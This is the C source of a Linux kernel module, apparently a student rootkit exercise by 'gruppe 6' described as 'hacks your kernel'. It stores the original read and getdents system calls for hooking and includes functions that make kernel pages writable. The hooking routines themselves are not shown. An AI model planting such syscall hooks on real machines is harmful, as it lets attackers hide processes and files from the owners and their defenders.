#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>

#include "sysmap.h"          /* Pointers to system functions */

// since we had no problems without get/put, we commented it out
// #define USE_MODULE_GET_PUT
#ifdef USE_MODULE_GET_PUT
#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -EAGAIN;}
#define OUR_MODULE_PUT module_put(THIS_MODULE)
#else
#define OUR_TRY_MODULE_GET 
#define OUR_MODULE_PUT 
#endif

//#define DEBUG_ON
#ifdef DEBUG_ON
#define OUR_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
#else
#define OUR_DEBUG(...)
#endif


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);

fun_ssize_t_int_pvoid_size_t     original_read;
fun_long_int_linux_dirent_int    original_getdents;
fun_long_int_linux_dirent64_int  original_getdents64;

/* Make a certain address writeable */
void make_page_writable(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);

    pageTableEntry->pte |=  _PAGE_RW;
}

/* Make a certain address readonly */
void make_page_readonly(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
}


/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    hook_functions();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_functions();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);


/* OTHER STUFF */

/*
 * Get rid of taint message by declaring code as GPL.
 */
MODULE_LICENSE("GPL");

/*
 * Module information
 */
MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */

